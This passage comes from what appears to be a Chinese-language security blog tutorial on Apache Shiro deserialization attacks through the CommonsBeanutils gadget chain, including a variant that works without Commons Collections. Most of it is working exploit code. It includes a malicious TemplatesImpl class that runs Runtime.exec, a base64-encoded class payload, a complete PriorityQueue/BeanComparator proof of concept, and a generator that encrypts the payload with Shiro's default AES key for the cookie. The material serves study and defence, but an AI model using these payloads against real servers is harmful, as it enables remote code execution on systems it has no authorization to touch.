= pool.get(Evil.class.getName());  </span><br><span class="line">        byte[] payloads = new CommonsCollectionsShiro().getPayload(clazz.toBytecode());  </span><br><span class="line">        AesCipherService aes = new AesCipherService();  </span><br><span class="line">  </span><br><span class="line">        byte[] key = Base64.decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;);  </span><br><span class="line">        ByteSource ciphertext = aes.encrypt(payloads, key);  </span><br><span class="line">        System.out.printf(ciphertext.toString());  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>evil.class</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.DOM;  </span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.TransletException;  </span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;  </span><br><span class="line">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;  </span><br><span class="line">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;  </span><br><span class="line">  </span><br><span class="line">public class Evil extends AbstractTranslet &#123;  </span><br><span class="line">    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;&#125;  </span><br><span class="line">  </span><br><span class="line">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;&#125;  </span><br><span class="line">  </span><br><span class="line">    public Evil() throws Exception &#123;  </span><br><span class="line">        super();  </span><br><span class="line">        System.out.println(&quot;Hello TemplatesImpl&quot;);  </span><br><span class="line">        Runtime.getRuntime().exec(&quot;calc.exe&quot;);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>把cookie传入shiro客户端 成功弹出计算器：</p><p><img src="/2023/05/19/JAVA-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/99.jpg"></p><h1 id="CommonsBeanutils-无依赖攻击"><a href="#CommonsBeanutils-无依赖攻击" class="headerlink" title="CommonsBeanutils(无依赖攻击)"></a>CommonsBeanutils(无依赖攻击)</h1><p>之前我们都是打了  CC依赖来进行攻击的，如CC3.2.1 ，那么原生的Shiro是没有CC依赖的，接下来了解一下 CB （Apache Commons Beanutils）</p><h2 id="Commons-Beanutils"><a href="#Commons-Beanutils" class="headerlink" title="Commons Beanutils"></a>Commons Beanutils</h2><p>Apache Commons Beanutils 是 Apache Commons 工具集下的另一个项目，他提供了 对普通类对象 （JAVABean）的一些操作方法，至于什么是JAVABEAN，以我的理解，拥有GET  SET方法的类，可以笼称 为JAVABEAN</p><p>如，Cat是一个最简单的 JavaBean:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">final public class Cat &#123; </span><br><span class="line">private String name = &quot;Ku1s&quot;; </span><br><span class="line">public String getName() &#123; </span><br><span class="line">return name; &#125; </span><br><span class="line"></span><br><span class="line">public void setName(String name) &#123; </span><br><span class="line">this.name = name;</span><br><span class="line"></span><br><span class="line">&#125; &#125;</span><br></pre></td></tr></table></figure><p>它包含一个私有属性name，和读取和设置这个属性的两个方法，又称为getter和setter。其中，getter 的方法名以get开头，setter的方法名以set开头，全名符合骆驼式命名法（Camel-Case）。</p><p>CB中 提供了一个静态方法： PropertyUtils.getProperty ，打印让我们看看什么情况</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public class Test &#123;  </span><br><span class="line">    public static void main(String[] args) throws InvocationTargetException, IllegalAccessException, NoSuchMethodException &#123;  </span><br><span class="line">        Object name = PropertyUtils.getProperty(new Cat(), &quot;name&quot;);  </span><br><span class="line">        System.out.println(name);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看来这个 getProperty 会调用我们的 getter方法，也就是getName，获得返回值，除此之外，PropertyUtils.getProperty 还支持 递归获取属性，比如 a对象中有属性b，b对象有属性c，我们可以通过 PropertyUtils.getProperty(a, “b.c”); 的方式进行递归获取。通过这个 方法，使用者可以很方便地调用任意对象的getter，适用于在不确定JavaBean是哪个类对象时使用。</p><h2 id="getter的利用"><a href="#getter的利用" class="headerlink" title="getter的利用"></a>getter的利用</h2><p>在 commons-beanutils包中存 在一个：<code> org.apache.commons.beanutils.BeanComparator 。</code></p><p>BeanComparator是CB提供用来比较两个 JAVAbean 是否相等的类，其实现了Comparator 和Serializable接口 ，咱们来看看他的compare比较方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">public int compare(T o1, T o2) &#123;  </span><br><span class="line">    if (this.property == null) &#123;  </span><br><span class="line">        return this.internalCompare(o1, o2);  </span><br><span class="line">    &#125; else &#123;  </span><br><span class="line">        try &#123;  </span><br><span class="line">            Object value1 = PropertyUtils.getProperty(o1, this.property);  </span><br><span class="line">            Object value2 = PropertyUtils.getProperty(o2, this.property);  </span><br><span class="line">            return this.internalCompare(value1, value2);  </span><br><span class="line">        &#125; catch (IllegalAccessException var5) &#123;  </span><br><span class="line">            throw new RuntimeException(&quot;IllegalAccessException: &quot; + var5.toString());  </span><br><span class="line">        &#125; catch (InvocationTargetException var6) &#123;  </span><br><span class="line">            throw new RuntimeException(&quot;InvocationTargetException: &quot; + var6.toString());  </span><br><span class="line">        &#125; catch (NoSuchMethodException var7) &#123;  </span><br><span class="line">            throw new RuntimeException(&quot;NoSuchMethodException: &quot; + var7.toString());  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>compare方法 接收两个对象：</p><ol><li>如果 这里的 property 为空，则直接比较这两个对象</li><li>如果这里的property 不为空，则调用PropertyUtils.getProperty，分别取这两个对象的 property属性，然后再比较他们的属性值。</li></ol><p>我们知道，PropertyUtils.getProperty 这个方法会自动调用 Getter 方法，这个点是任意代码执行的关键，有没有什么方法可以执行恶意代码执行呢？ 其实是有的</p><p>在第一篇  <a href="https://snowlyzz.github.io/2023/05/16/JAVA%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/">JAVA动态加载字节码 | Ku1s (snowlyzz.github.io)</a>, 其中在跟源码的时候，有这么一条链</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl#getOutputProperties() -&gt; </span><br><span class="line">TemplatesImpl#newTransformer() -&gt; </span><br><span class="line">TemplatesImpl#getTransletInstance() -&gt; </span><br><span class="line">TemplatesImpl#defineTransletClasses() -&gt; </span><br><span class="line">TransletClassLoader#defineClass()</span><br></pre></td></tr></table></figure><p>看到 第一个 getOutputProperties，我们是否可以利用 Getter 自动去调用其 getOutputProperties()方法呢？然后后续再进行恶意字节码。</p><p>所以  PropertyUtils.getProperty( obj1, property ) 这段代码 ，obj1 是一个 TemplatesImpl 对象，而 property 的值为 outputProperties时，则会自动调用 getter 方法，也就是 TemplatesImpl#getOutputProperties() 方法，触发代码执行。</p><h2 id="getter反序列化利用连构造"><a href="#getter反序列化利用连构造" class="headerlink" title="getter反序列化利用连构造"></a>getter反序列化利用连构造</h2><p>了解了大概原理，接下来来构造一下 利用链</p><p>还是先构造 TemplatesImpl：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">byte[] code = Base64.getDecoder().decode(&quot;yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAGwEAClNvdXJjZUZpbGUBAA1FdmlsVGVzdC5qYXZhDAAOAA8HABwMAB0AHgEABGNhbGMMAB8AIAEACEV2aWxUZXN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAMAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAAEQALAAAABAABAAwAAQAOAA8AAgAJAAAALgACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAABAAoAAAAOAAMAAAASAAQAEwANABQACwAAAAQAAQAQAAEAEQAAAAIAEg==&quot;);  </span><br><span class="line">TemplatesImpl obj = new TemplatesImpl();  </span><br><span class="line">setFieldValue(obj,&quot;_bytecodes&quot;,new byte[][]&#123;code&#125;);  </span><br><span class="line">setFieldValue(obj,&quot;_name&quot;,&quot;ku1s&quot;);  </span><br><span class="line">setFieldValue(obj,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span><br></pre></td></tr></table></figure><p>然后 到我们的 BeanComparator.class  ,进行实例化。如果我们默认 BeanComparator.class 构造函数为空时，默认的 property 就为空 :</p><p><img src="/2023/05/19/JAVA-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/null.jpg"></p><p><code>final BeanComparator comparator = new BeanComparator();</code></p><p>然后用这个 comparator实例化优先队列 PriorityQueue ：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">final PriorityQueue queue = new PriorityQueue(2, comparator); </span><br><span class="line">// stub data for replacement later </span><br><span class="line">queue.add(1);</span><br><span class="line">queue.add(1);</span><br><span class="line"></span><br><span class="line">// comparator = BeanComparator对象</span><br></pre></td></tr></table></figure><p>至于为什么要 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">priorityQueue.add(1);</span><br><span class="line">priorityQueue.add(2);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>时为了进行 内部的堆需要调整，进行元素的比较的话，肯定得至少两个元素才可以。这一点也在反序列化链的代码中得到了体现：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">private void heapify() &#123;</span><br><span class="line">    for (int i = (size &gt;&gt;&gt; 1) - 1; i &gt;= 0; i--)</span><br><span class="line">        siftDown(i, (E) queue[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>初始化时使用正经对象，且 property 为空，这一系列操作是为了初始化的时候不要出错。然后，我们 再用反射将 property 的值设置成恶意的 outputProperties ，将队列里的两个1替换成恶意的 TemplateImpl 对象：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setFieldValue(comparator, &quot;property&quot;, &quot;outputProperties&quot;); </span><br><span class="line">setFieldValue(queue, &quot;queue&quot;, new Object[]&#123;obj, obj&#125;);</span><br></pre></td></tr></table></figure><p>调用链：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">new PriorityQueue(2,comparator=BeanComparator对象)</span><br><span class="line">PriorityQueue#readObject() =&gt;</span><br><span class="line">heapify() =&gt;</span><br><span class="line">siftDown() = &gt;</span><br><span class="line">siftDownUsingComparator()=&gt;</span><br><span class="line">comparator.compare()</span><br><span class="line"></span><br><span class="line">BeanComparator#compare() =&gt;</span><br><span class="line">if (this.property == null) &#123;&#125;=&gt;</span><br><span class="line"></span><br><span class="line">Object value1 = PropertyUtils.getProperty(o1, this.property);</span><br><span class="line">Object value2 = PropertyUtils.getProperty(o2, this.property);</span><br><span class="line"></span><br><span class="line">TemplatesImpl#getOutputProperties()=&gt;</span><br><span class="line">/**/</span><br><span class="line">TemplatesImpl#defineClass()</span><br></pre></td></tr></table></figure><p>完整POC：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">public class Test &#123;  </span><br><span class="line">    public static void main(String[] args) throws Exception &#123;  </span><br><span class="line">        byte[] code = Base64.getDecoder().decode(&quot;yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAGwEAClNvdXJjZUZpbGUBAA1FdmlsVGVzdC5qYXZhDAAOAA8HABwMAB0AHgEABGNhbGMMAB8AIAEACEV2aWxUZXN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAMAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAAEQALAAAABAABAAwAAQAOAA8AAgAJAAAALgACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAABAAoAAAAOAAMAAAASAAQAEwANABQACwAAAAQAAQAQAAEAEQAAAAIAEg==&quot;);  </span><br><span class="line">        TemplatesImpl templates = new TemplatesImpl();  </span><br><span class="line">        setFieldValue(templates,&quot;_bytecodes&quot;,new byte[][]&#123;code&#125;);  </span><br><span class="line">        setFieldValue(templates,&quot;_name&quot;,&quot;ku1s&quot;);  </span><br><span class="line">        setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());  </span><br><span class="line">  </span><br><span class="line">        BeanComparator comparator = new BeanComparator();//使 property =null 避免出错  </span><br><span class="line">  </span><br><span class="line">        PriorityQueue priorityQueue = new PriorityQueue(2,comparator);  </span><br><span class="line">        priorityQueue.add(1);  </span><br><span class="line">        priorityQueue.add(1);  </span><br><span class="line">        //将没改的值 改成恶意值  </span><br><span class="line">        setFieldValue(comparator,&quot;property&quot;,&quot;outputProperties&quot;); //改成outputProperties,使自动调用getOutputProperties  </span><br><span class="line">        setFieldValue(priorityQueue,&quot;queue&quot;,new Object[]&#123;templates, templates&#125;); //让其去对比，且满足 queue[right]) &gt; 0  </span><br><span class="line">        byte[] serialize = serialize(priorityQueue);  </span><br><span class="line">        unserialize(serialize);  </span><br><span class="line">    &#125;  </span><br><span class="line">    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception&#123;  </span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);  </span><br><span class="line">        field.setAccessible(true);  </span><br><span class="line">        field.set(obj,value);  </span><br><span class="line">    &#125;  </span><br><span class="line">    public static void unserialize(byte[] bytes) throws Exception&#123;  </span><br><span class="line">        try(ByteArrayInputStream bain = new ByteArrayInputStream(bytes);  </span><br><span class="line">            ObjectInputStream oin = new ObjectInputStream(bain))&#123;  </span><br><span class="line">            oin.readObject();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    public static byte[] serialize(Object o) throws Exception&#123;  </span><br><span class="line">        try(ByteArrayOutputStream baout = new ByteArrayOutputStream();  </span><br><span class="line">            ObjectOutputStream oout = new ObjectOutputStream(baout))&#123;  </span><br><span class="line">            oout.writeObject(o);  </span><br><span class="line">            return baout.toByteArray();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功弹出计算器~~~<br><img src="/2023/05/19/JAVA-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/pc1.jpg"></p><h2 id="无依赖的Shiro反序列化利用"><a href="#无依赖的Shiro反序列化利用" class="headerlink" title="无依赖的Shiro反序列化利用"></a>无依赖的Shiro反序列化利用</h2><p>我们用上一个poc 发送payload 时会发现<br><img src="/2023/05/19/JAVA-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/ud.jpg"></p><p><code>Unable to load class named [org.apache.commons.collections.comparators.ComparableComparator]</code></p><p>简单来说就是没有找到 org.apache.commons.collections.comparators.ComparableComparator 类，从包名即可看出，这个类是来自于commons-collections。</p><p>在实际场景下，目标可能没有安装 commons-collections依赖，那么这个时候，ComparableComparator这个类是用不了的，因为他依赖于CC，也就是我们刚刚用的那个POC，那么难道没有CC就不能利用吗？</p><p>我们先来看看这个 org.apache.commons.collections.comparators.ComparableComparator 这个类在 哪里使用了：</p><p>有两处 调用了  ComparableComparator ：</p><ol><li><p>ReverseComparator<br><img src="/2023/05/19/JAVA-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/rev.jpg"></p></li><li><p>BeanComparator<br><img src="/2023/05/19/JAVA-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/bc.jpg"></p></li></ol><p>这里 两者利用点都是类似的，所以只讲 BeanComparator 。</p><p>在BeanComparator 类的构造函数处，当没有显式传入 Comparator 的情况下，则默认使用 ComparableComparator 。</p><p>既然此时 ComparableComparator 依赖于CC，并且我们用不了了,我们需要找到一个类来平替掉ComparableComparator，它满足下面这几个条件：</p><ol><li>实现 java.util.Comparator 接口 </li><li>实现 java.io.Serializable 接口 </li><li>Java、shiro或commons-beanutils自带，且兼容性强</li></ol><p>通过IDEA的功能，我们找到一个 CaseInsensitiveComparator ：</p><p><img src="/2023/05/19/JAVA-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/ks.png"></p><p>其代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">public static final Comparator&lt;String&gt; CASE_INSENSITIVE_ORDER  </span><br><span class="line">                                     = new CaseInsensitiveComparator();  </span><br><span class="line">private static class CaseInsensitiveComparator  </span><br><span class="line">        implements Comparator&lt;String&gt;, java.io.Serializable &#123;  </span><br><span class="line">    // use serialVersionUID from JDK 1.2.2 for interoperability  </span><br><span class="line">    private static final long serialVersionUID = 8575799808933029326L;  </span><br><span class="line">  </span><br><span class="line">    public int compare(String s1, String s2) &#123;  </span><br><span class="line">        int n1 = s1.length();  </span><br><span class="line">        int n2 = s2.length();  </span><br><span class="line">        int min = Math.min(n1, n2);  </span><br><span class="line">        for (int i = 0; i &lt; min; i++) &#123;  </span><br><span class="line">            char c1 = s1.charAt(i);  </span><br><span class="line">            char c2 = s2.charAt(i);  </span><br><span class="line">            if (c1 != c2) &#123;  </span><br><span class="line">                c1 = Character.toUpperCase(c1);  </span><br><span class="line">                c2 = Character.toUpperCase(c2);  </span><br><span class="line">                if (c1 != c2) &#123;  </span><br><span class="line">                    c1 = Character.toLowerCase(c1);  </span><br><span class="line">                    c2 = Character.toLowerCase(c2);  </span><br><span class="line">                    if (c1 != c2) &#123;  </span><br><span class="line">                        // No overflow because of numeric promotion  </span><br><span class="line">                        return c1 - c2;  </span><br><span class="line">                    &#125;  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">        return n1 - n2;  </span><br><span class="line">    &#125;</span><br><span class="line">    private Object readResolve() &#123; return CASE_INSENSITIVE_ORDER; &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个类是 java.lang.String 类下的私有类，实现了 Comparator 和 Serializable，是个好的替代品<br>我们通过 String.CASE_INSENSITIVE_ORDER 即可拿到上下文中的 CaseInsensitiveComparator 对 象，用它来实例化 BeanComparator ：</p><p>构造链如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">public class CommonsCollectionsShiro &#123;  </span><br><span class="line">        public byte[] getPayload(byte[] clazzBytes) throws Exception &#123;  </span><br><span class="line">            TemplatesImpl templates = new TemplatesImpl();  </span><br><span class="line">            setFieldValue(templates,&quot;_bytecodes&quot;,new byte[][]&#123;clazzBytes&#125;);  </span><br><span class="line">            setFieldValue(templates,&quot;_name&quot;,&quot;ku1s&quot;);  </span><br><span class="line">            setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());  </span><br><span class="line">  </span><br><span class="line">            BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);//使 property =null 避免出错  </span><br><span class="line">  </span><br><span class="line">            final PriorityQueue&lt;Object&gt; priorityQueue = new PriorityQueue&lt;Object&gt;(2, comparator);  </span><br><span class="line">  </span><br><span class="line">            priorityQueue.add(&quot;1&quot;);  </span><br><span class="line">            priorityQueue.add(&quot;1&quot;);  </span><br><span class="line">            //将没改的值 改成恶意值  </span><br><span class="line">            setFieldValue(comparator,&quot;property&quot;,&quot;outputProperties&quot;); //改成outputProperties,使自动调用getOutputProperties  </span><br><span class="line">            setFieldValue(priorityQueue,&quot;queue&quot;,new Object[]&#123;templates, templates&#125;); //让其去对比，且满足 queue[right]) &gt; 0  </span><br><span class="line">  </span><br><span class="line">            // ==================            // 生成序列化字符串  </span><br><span class="line">            ByteArrayOutputStream barr = new ByteArrayOutputStream();  </span><br><span class="line">            ObjectOutputStream oos = new ObjectOutputStream(barr);  </span><br><span class="line">            oos.writeObject(priorityQueue);  </span><br><span class="line">            oos.close();  </span><br><span class="line">  </span><br><span class="line">            return barr.toByteArray();  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception &#123;  </span><br><span class="line">            Field field = obj.getClass().getDeclaredField(fieldName);  </span><br><span class="line">            field.setAccessible(true);  </span><br><span class="line">            field.set(obj, value);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>Client.class</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public class Client &#123;  </span><br><span class="line">    public static void main(String[] args) throws Exception &#123;  </span><br><span class="line">        byte[] payloads = new 